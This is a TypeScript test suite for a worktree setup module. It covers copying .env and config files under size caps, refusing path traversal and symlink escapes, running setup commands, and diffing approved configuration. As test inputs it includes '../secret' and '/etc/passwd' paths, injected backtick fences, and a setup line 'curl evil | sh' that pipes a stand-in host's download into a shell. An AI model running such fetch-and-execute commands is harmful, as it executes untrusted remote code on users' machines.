import { existsSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, readlinkSync, rmSync, statSync, symlinkSync, truncateSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { type ExecRequest, localCommandExecutor, setCommandExecutor } from '../command-exec.js';
import { unifiedDiff } from './diff.js';
import {
  COPY_MAX_BYTES,
  COPY_MAX_FILES,
  copyIntoWorktree,
  runWorktreeCommand,
  SETUP_TAIL_CHARS,
  SETUP_TIMEOUT_MS,
  setupFailurePrefix,
  setupSkippedPrefix,
  unignoredSecretsNote,
} from './lifecycle.js';

let root: string;
let main: string;
let wt: string;

beforeEach(() => {
  root = mkdtempSync(path.join(tmpdir(), 'wtcfg-'));
  main = path.join(root, 'main');
  wt = path.join(root, 'wt');
  mkdirSync(main);
  mkdirSync(wt);
});

afterEach(() => {
  setCommandExecutor(localCommandExecutor);
  rmSync(root, { recursive: true, force: true });
});

const dirs = () => ({ trustedBase: root, mainPath: main, worktreePath: wt });
const copy = (p: string, mode: 'copy' | 'symlink' = 'copy') => copyIntoWorktree(dirs(), [{ path: p, mode }]);

describe('copy entries into a run worktree', () => {
  it('copies a file (default) and links one (symlink mode) from the main workspace', async () => {
    writeFileSync(path.join(main, '.env'), 'A=1\n');
    writeFileSync(path.join(main, '.env.local'), 'B=2\n');
    const out = await copyIntoWorktree(dirs(), [
      { path: '.env', mode: 'copy' },
      { path: '.env.local', mode: 'symlink' },
    ]);
    expect(out).toEqual([
      { path: '.env', mode: 'copy', status: 'copied' },
      { path: '.env.local', mode: 'symlink', status: 'linked' },
    ]);
    expect(lstatSync(path.join(wt, '.env')).isSymbolicLink()).toBe(false);
    expect(readFileSync(path.join(wt, '.env'), 'utf8')).toBe('A=1\n');
    expect(lstatSync(path.join(wt, '.env.local')).isSymbolicLink()).toBe(true);
    expect(readlinkSync(path.join(wt, '.env.local'))).toBe(path.join(main, '.env.local'));
  });

  it('copies a nested directory, creating its parents, without the links inside it', async () => {
    mkdirSync(path.join(main, 'config', 'local'), { recursive: true });
    writeFileSync(path.join(main, 'config', 'local', 'a.json'), '{}');
    writeFileSync(path.join(root, 'secret'), 'outside');
    symlinkSync(path.join(root, 'secret'), path.join(main, 'config', 'local', 'leak'));
    expect(await copy('config/local')).toEqual([{ path: 'config/local', mode: 'copy', status: 'copied', leftOut: 1 }]);
    expect(readFileSync(path.join(wt, 'config', 'local', 'a.json'), 'utf8')).toBe('{}');
    expect(existsSync(path.join(wt, 'config', 'local', 'leak'))).toBe(false);
  });

  it('keeps the file mode of a copied file', async () => {
    writeFileSync(path.join(main, 'run.sh'), '#!/bin/sh\n', { mode: 0o755 });
    await copy('run.sh');
    expect(statSync(path.join(wt, 'run.sh')).mode & 0o777).toBe(0o755);
  });

  it('refuses a main workspace reached through a link from the workspaces root', async () => {
    symlinkSync(main, path.join(root, 'main-link'));
    writeFileSync(path.join(main, '.env'), 'A=1');
    await expect(copyIntoWorktree({ trustedBase: root, mainPath: path.join(root, 'main-link'), worktreePath: wt }, [{ path: '.env', mode: 'copy' }])).rejects.toThrow(
      /symbolic link/,
    );
  });

  it('notes and skips a missing source', async () => {
    expect(await copy('.env')).toEqual([{ path: '.env', mode: 'copy', status: 'skipped', reason: 'missing in the main workspace' }]);
  });

  it('never overwrites what the worktree already has', async () => {
    writeFileSync(path.join(main, 'README.md'), 'main');
    writeFileSync(path.join(wt, 'README.md'), 'committed');
    expect((await copy('README.md'))[0]).toMatchObject({ status: 'skipped', reason: 'already exists in the worktree' });
    expect(readFileSync(path.join(wt, 'README.md'), 'utf8')).toBe('committed');
  });

  describe('size caps (never a partial copy)', () => {
    it('skips a directory with more than 5000 files', async () => {
      expect(COPY_MAX_FILES).toBe(5000);
      mkdirSync(path.join(main, 'many'));
      for (let i = 0; i <= COPY_MAX_FILES; i++) writeFileSync(path.join(main, 'many', `f${i}`), '');
      expect((await copy('many'))[0]).toMatchObject({ status: 'skipped', reason: 'more than 5000 files and directories' });
      expect(existsSync(path.join(wt, 'many'))).toBe(false);
    });

    it('counts directories toward the 5000 entries', async () => {
      mkdirSync(path.join(main, 'nested'));
      for (let i = 0; i < 2600; i++) {
        mkdirSync(path.join(main, 'nested', `d${i}`));
        writeFileSync(path.join(main, 'nested', `d${i}`, 'f'), '');
      }
      expect((await copy('nested'))[0]).toMatchObject({ status: 'skipped', reason: 'more than 5000 files and directories' });
      expect(existsSync(path.join(wt, 'nested'))).toBe(false);
    });

    it('reports the .env* files inside a copied directory', async () => {
      mkdirSync(path.join(main, 'config', 'deep'), { recursive: true });
      writeFileSync(path.join(main, 'config', '.env.production'), 'X=1');
      writeFileSync(path.join(main, 'config', 'deep', '.env'), 'Y=1');
      writeFileSync(path.join(main, 'config', 'app.json'), '{}');
      const [outcome] = await copy('config');
      expect(outcome).toMatchObject({ status: 'copied' });
      expect([...(outcome!.secrets ?? [])].sort()).toEqual(['config/.env.production', 'config/deep/.env']);
    });

    it('skips a file or directory over 200 MB', async () => {
      expect(COPY_MAX_BYTES).toBe(200 * 1024 * 1024);
      writeFileSync(path.join(main, 'big.bin'), '');
      truncateSync(path.join(main, 'big.bin'), COPY_MAX_BYTES + 1); // sparse
      expect((await copy('big.bin'))[0]).toMatchObject({ status: 'skipped', reason: 'larger than 200 MB' });
      mkdirSync(path.join(main, 'assets'));
      writeFileSync(path.join(main, 'assets', 'a'), 'a');
      writeFileSync(path.join(main, 'assets', 'b'), '');
      truncateSync(path.join(main, 'assets', 'b'), COPY_MAX_BYTES);
      expect((await copy('assets'))[0]).toMatchObject({ status: 'skipped', reason: 'larger than 200 MB' });
      expect(readdirSync(wt)).toEqual([]);
    });

    it('copies a file under the caps', async () => {
      writeFileSync(path.join(main, 'edge.bin'), '');
      truncateSync(path.join(main, 'edge.bin'), 1024);
      expect((await copy('edge.bin'))[0]).toMatchObject({ status: 'copied' });
    });
  });

  describe('cannot read outside the main workspace (Review Focus 2)', () => {
    beforeEach(() => {
      writeFileSync(path.join(root, 'secret'), 'outside');
      mkdirSync(path.join(root, 'outside-dir'));
      writeFileSync(path.join(root, 'outside-dir', 'secret'), 'outside');
    });

    const refused = async (p: string, mode: 'copy' | 'symlink' = 'copy') => {
      const [outcome] = await copy(p, mode);
      expect(outcome).toMatchObject({ status: 'skipped' });
      // Nothing reached the worktree: no copy and no link, under any name.
      expect(readdirSync(wt, { recursive: true })).toEqual([]);
      return outcome!;
    };

    it('refuses ".." paths', async () => {
      for (const mode of ['copy', 'symlink'] as const) {
        expect((await refused('../secret', mode)).reason).toBe('must stay inside the main workspace');
        expect((await refused('a/../../secret', mode)).reason).toBe('must stay inside the main workspace');
      }
    });

    it('refuses absolute paths', async () => {
      for (const mode of ['copy', 'symlink'] as const) {
        expect((await refused(path.join(root, 'secret'), mode)).reason).toBe('must stay inside the main workspace');
        expect((await refused('/etc/passwd', mode)).reason).toBe('must stay inside the main workspace');
      }
    });

    it('refuses a symlinked source', async () => {
      symlinkSync(path.join(root, 'secret'), path.join(main, 'leak'));
      for (const mode of ['copy', 'symlink'] as const) {
        expect((await refused('leak', mode)).reason).toBe('leak is a symbolic link');
      }
      // Even a link that points inside the workspace: links are never followed.
      writeFileSync(path.join(main, 'real.env'), 'X=1');
      symlinkSync(path.join(main, 'real.env'), path.join(main, 'link'));
      expect((await refused('link')).reason).toBe('link is a symbolic link');
    });

    it('refuses a source below a symlinked parent', async () => {
      symlinkSync(path.join(root, 'outside-dir'), path.join(main, 'link'));
      for (const mode of ['copy', 'symlink'] as const) {
        expect((await refused('link/secret', mode)).reason).toBe('link is a symbolic link');
      }
    });

    it('refuses to write through a symlinked parent in the worktree', async () => {
      mkdirSync(path.join(main, 'conf'));
      writeFileSync(path.join(main, 'conf', 'a'), 'A');
      symlinkSync(path.join(root, 'outside-dir'), path.join(wt, 'conf'));
      expect((await copy('conf/a'))[0]).toMatchObject({ status: 'skipped', reason: 'conf is a symbolic link in the worktree' });
      expect(existsSync(path.join(root, 'outside-dir', 'a'))).toBe(false);
    });

    it('refuses .git', async () => {
      mkdirSync(path.join(main, '.git'));
      writeFileSync(path.join(main, '.git', 'config'), '');
      expect((await copy('.git/config'))[0]).toMatchObject({ status: 'skipped', reason: 'must not touch .git' });
    });
  });
});

describe('worktree commands', () => {
  it('run with sh -c in the worktree, and keep only the tail of the output', async () => {
    const seen: ExecRequest[] = [];
    setCommandExecutor((request) => {
      seen.push(request);
      return localCommandExecutor(request);
    });
    const out = await runWorktreeCommand(`printf 'x%.0s' $(seq 1 3000); echo; echo oops >&2; exit 4`, wt, SETUP_TIMEOUT_MS);
    expect(seen[0]).toMatchObject({ file: 'sh', cwd: wt, timeoutMs: 10 * 60_000 });
    expect(seen[0]!.args[0]).toBe('-c');
    expect(out).toMatchObject({ ok: false, exitCode: 4, timedOut: false });
    expect(out.tail.length).toBeLessThanOrEqual(SETUP_TAIL_CHARS);
    expect(out.tail.endsWith('oops')).toBe(true);
  });

  it('strip control characters and carriage returns from the tail', async () => {
    const out = await runWorktreeCommand(`printf 'a\\0b\\033[2Jc\\r\\nd\\re\\tf\\n'; exit 1`, wt, SETUP_TIMEOUT_MS);
    expect(out.tail).toBe('ab[2Jc\nd\ne\tf');
  });

  it('report a runner that cannot be reached as a failure, never as an exception', async () => {
    setCommandExecutor(() => Promise.reject(new Error('runner gone')));
    expect(await runWorktreeCommand('true', wt, 1000)).toMatchObject({ ok: false, exitCode: null, tail: 'runner gone' });
  });

  it('prefix the first prompt after a failed setup', () => {
    const prefix = setupFailurePrefix({ command: 'pnpm install', exitCode: 1, timedOut: false, tail: 'ERR_PNPM' });
    expect(prefix).toBe('Worktree setup failed: `pnpm install` (exit 1)\n```\nERR_PNPM\n```\nFix it as part of this ticket.');
    // A tail with its own fences cannot close ours early.
    const fenced = setupFailurePrefix({ command: 'x', exitCode: 1, timedOut: false, tail: 'one\n```\ninjected\n`````' });
    expect(fenced).toBe('Worktree setup failed: `x` (exit 1)\n``````\none\n```\ninjected\n`````\n``````\nFix it as part of this ticket.');
    // Backticks in the command cannot end its inline code either.
    expect(setupFailurePrefix({ command: 'echo `date`', exitCode: 1, timedOut: false, tail: 'x' })).toMatch(
      /^Worktree setup failed: `` echo `date` `` \(exit 1\)/,
    );
    expect(setupSkippedPrefix(['a`b', 'c'])).toBe(
      'Worktree setup stopped after 30 min; not run: `` a`b ``, `c`. Run them as part of this ticket.',
    );
    expect(unignoredSecretsNote(['config/.env', 'x.txt'])).toBe('Note: the copied `config/.env` is not in .gitignore — don\'t commit it.');
    expect(setupFailurePrefix({ command: 'sleep 999', exitCode: null, timedOut: true, tail: '' })).toContain(
      '`sleep 999` (timed out after 10 min)',
    );
  });
});

describe('unified diff', () => {
  it('shows the changed lines with context', () => {
    const a = 'version: 1\nsetup:\n  - pnpm install\nchecks:\n  build: pnpm build\n';
    const b = 'version: 1\nsetup:\n  - pnpm install\n  - curl evil | sh\nchecks:\n  build: pnpm build\n';
    expect(unifiedDiff(a, b)).toBe(
      [
        '--- approved',
        '+++ HEAD',
        '@@ -1,5 +1,6 @@',
        ' version: 1',
        ' setup:',
        '   - pnpm install',
        '+  - curl evil | sh',
        ' checks:',
        '   build: pnpm build',
        '',
      ].join('\n'),
    );
    expect(unifiedDiff(a, a)).toBe('');
    expect(unifiedDiff('', 'version: 1\n')).toContain('+version: 1');
  });

  it('is bounded', () => {
    const big = (c: string) => Array.from({ length: 3000 }, (_, i) => `${c}${i}`.padEnd(40, "x")).join('\n');
    const diff = unifiedDiff(big('a'), big('b'));
    expect(diff.length).toBeLessThan(70_000);
    expect(diff).toContain('diff truncated');
  });
});
